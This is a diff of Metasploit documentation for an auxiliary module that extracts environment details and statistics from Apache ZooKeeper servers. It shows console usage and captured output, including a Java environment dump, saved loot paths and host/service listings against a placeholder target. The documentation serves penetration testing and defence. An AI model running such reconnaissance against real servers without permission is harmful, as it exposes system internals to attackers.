@@ -1,13 +1,8 @@
-## Vulnerable Application
-
 ### Description
 
 This module targets Apache ZooKeeper service instances to extract information about the system environment, and service statistics.
 
 ### Verification Steps
-
-
-## Scenarios
 
 ```
 msf5 > use auxiliary/gather/zookeeper_info_disclosure
@@ -46,8 +41,12 @@ References:
 
 msf5 auxiliary(gather/zookeeper_info_disclosure) > run
 
-[*] 1.3.3.7:2181       - Dumping environment info...
-[+] 1.3.3.7:2181       - Environment:
+[*] 1.3.3.7:2181     - Using a timeout of 30...
+[*] 1.3.3.7:2181     - Verifying if server is responding...
+[+] 1.3.3.7:2181     - Server says: imok. Going ahead with extraction..
+
+[*] 1.3.3.7:2181     - Dumping environment info...
+[+] 1.3.3.7:2181     - Environment:
 zookeeper.version=3.4.9-1757313, built on 08/23/2016 06:50 GMT
 host.name=localhost.localdomain
 java.version=1.8.0_162
@@ -86,6 +85,7 @@ Mode: follower
 Node count: 1041
 
 [+] 1.3.3.7:2181       - File saved in: /root/.msf4/loot/20201013203537_default_1.3.3.7_statlog_417795.txt
+
 [*] 1.3.3.7:2181       - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 
@@ -100,6 +100,24 @@ host           service  	type         	name             content     	info       
 ----           -------  	----         	----             -------    	----       ----
 1.3.3.7        environ-log  	Zookeeper 	Environment Log  text/plain  	Zookeeper  /root/.msf4/loot/20201013203537_default_1.3.3.7_environlog_604018.txt 
 1.3.3.7        stat-log     	Zookeeper 	Stat Log         text/plain  	Zookeeper  /root/.msf4/loot/20201013203537_default_1.3.3.7_statlog_417795.txt
+
+
+msf5 auxiliary(gather/zookeeper_info_disclosure) > services 
+Services
+========
+
+host       port  proto  name       state  info
+----       ----  -----  ----       -----  ----
+1.3.3.7    2181  tcp    zookeeper  open   Apache Zookeeper: 3.4.13-2--1
+
+msf5 auxiliary(gather/zookeeper_info_disclosure) > hosts
+
+Hosts
+=====
+
+address        mac   name        os_name  os_flavor  os_sp  purpose  info  comments
+-------        ---   ----        -------  ---------  -----  -------  ----  --------
+1.3.3.7              localhost   Linux    device                           Linux amd64 3.10.0-1062.12.1.el7.x86_64
 
 
 ```
